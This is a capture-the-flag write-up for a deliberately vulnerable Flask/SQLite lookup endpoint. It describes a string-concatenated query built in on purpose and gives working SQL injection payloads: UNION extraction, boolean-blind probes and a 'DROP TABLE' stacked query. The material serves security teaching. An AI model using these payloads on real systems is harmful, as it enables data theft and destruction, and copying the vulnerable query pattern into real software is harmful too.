# SQLi_Filtered – Personalised Write‑up

**Category:** Web – 150 pts
**Flag:** `flag{sqli_filtered}`

---

## Simple Challenge Flow

1. The application only has a single point of GET /lookup?uid=<value>
2. Using `1` returns `User name: alice`, confirming there is a `users` table
3. By using all types of regex and the basic tests you see that the code blocks the quotes and semicolons, meaning that it must be Numeric SQL, this means the payload must be something like 0 UNION SELECT 1-- without quotes and semicolons
4. using 0 UNION SELECT sql FROM sqlite_master--, I can reveal that there is a table called very_secret
5. From here I can find the flag using 0 UNION SELECT flag FROM very_secret--
6. This reveals the flag of flag{sqli_filtered}


---


## How Difficulty Was Increased and Defence Mechanisms

I increased the difficulty by prohibiting the use of '," and ; through using a numeric solution when the normally, the solutions are string-based. I further used Generic error messages that would force blind experimentation instead of having the given error messages. I also recompiled the regex after each request to make a new compilation that would slightly obfuscates the code path. I implemented Quote and Semicolon to block ' OR 1=1-- and other similar classic solves. 


---

## Indepth Build and Solution Notes

### Build Section

This CTF challenge is a tiny flask web app that usese SQLite. It exposes one endpoint which is the GET /lookup?uid=<value> that looks up a user's name by uid and prints it. 
This task initially creates an sqlite file next to the script as a .db and it makes a flag of "flag{sqli_filtered}". It then creates 2 tables of users as users(uid, name) pre‑seeded with A/B/C and a very_secret(flag) containing the flag. At the lookup endpoint, the code gets a uid from the query string and blocks quotes and semicolons (returns HTTP 400) to stop obvious SQL payloads. The reason why SQL injections can appear for this task is because of the line 
```python
    query = "SELECT name FROM users WHERE uid = " + uid
    query = "SELECT name FROM users WHERE uid = ?", (int(uid),)
```
compared to the much safer version listed below it. This allows for sql injections as this task in particular is an integer-based in-band union based SQL injection, playing off the classic UNION-based sqli with a numeric filter that exludes string literals. This filter increases the difficulty by narrowing the attack surface and forcing knowledge of SQLite's schema and ordering tricks and column cardinality. I also limited the use of error checking in this test where the use of "return "SQL error", 400" as a result of regexing with certain commands that are used to usually test sql injections. 
To demonstrate this, here is a list of the common sql attacks and how they fail against the filter and how it forces certain difficulty. 

| Attack style | With Filter | Without Filter | Example payload | What happens / why|
| - | - | - | - | - |
| **Tautology** | **Yes** | **Yes** | `1 OR 1=1--` | WHERE becomes `uid = 1 OR 1=1` → many rows and app prints first (“A”). |
| **String‑based tautology** | **No** (needs quotes) | **Yes** | `0 OR 'a'='a'--` | Quotes make it easy to force TRUE but blocked in filtered version. |
| **UNION‑based** | **Yes** | **Yes** | `0 UNION SELECT flag FROM very_secret--` | Column count = 1 matches `name` and returns the flag.                                                               |
| **UNION + targeted schema query** | **Harder** (Solution Path) | **Yes** | `0 UNION SELECT sql FROM sqlite_master WHERE name='very_secret'--` | With quotes, it directly filter to the target table, without quotes, it’s simpler. |
| **Boolean‑based blind** | **Possible** (sql functions) | **Easier** (use quoted chars/LIKE)  | With filter: `1 AND substr((SELECT flag FROM very_secret),1,1)=char(102)--`  \| Without filter: `1 AND substr((SELECT flag FROM very_secret),1,1)='f'--` | You can get TRUE/FALSE by response difference (`User name: …` vs `Len=0`).                                         |
| **Error‑based** | **Weak** (generic “SQL error” hides details) | **Still weak** | `1'`  | App returns just “SQL error”, so you can’t infer from error text either way. |
| **Time‑based blind** | **N/A** | **N/A** | **N/A** | SQLite doesn’t have a sleep functions |
| **Stacked queries**  | **No** | **Yes** | `1; DROP TABLE users--` | `sqlite3.execute()` only allows one statement so stacked won’t run unless the app used `executescript()`. |




### Solution Section


0. Run the server
- Use python3 app.py in web-sqli-filtered
- Make sure that all dependencies are present
- head to the home page https://127.0.0.1:5000



1. Normal Request as Recon
- Request = `1`
- Response = `User name: A`
This confirms that there is a table and that it has a single-column at least

2. Filter Behabiour
- Request = `1;` or `1'`
- Response = `Nice try`
This confirms that the challenge has quotes and semicolon filtering, leading the user to not use quotes and instead use the union path.

3. Cardinality of Column
- Request = `0 UNION SELECT 1--`
- Response = `User name: 1`
This confirms that UNION is accepted in this task and allows for other UNION based request to be allowed

4. Schema enumeration
- Request = `0 UNION SELECT sql FROM sqlite_master--`
- Response = `CREATE TABLE ... very_secret(flag TEXT)`
This confirms the target table and column names without using quotes and requires general knowledge of sqlite.

5. Flag Extraction
- Request = `0 UNION SELECT flag FROM very_secret--`
- Response = `User name: flag{sqli_filtered}`
This confirms that the exploit path works ad shows the in-band leakage. 



## Related & Future Variants
- Blind‑SQLi via time‑based or Boolean‑based techniques when direct feedback is suppressed
- Second‑Order SQLi where inputs are stored in one context and later executed in a different query
- Out‑of‑band SQLi leveraging DNS/HTTP exfiltration to leak data when in‑band channels are filtered

---

### Sources
* **OWASP testing Guide** https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
* **PentesterLab – SQL Injection** https://pentesterlab.com
* **PayloadsAllTheThings – SQLi** https://github.com/swisskyrepo/PayloadsAllTheThings
* **SQLite Docs** https://www.sqlite.org/lang_select.html
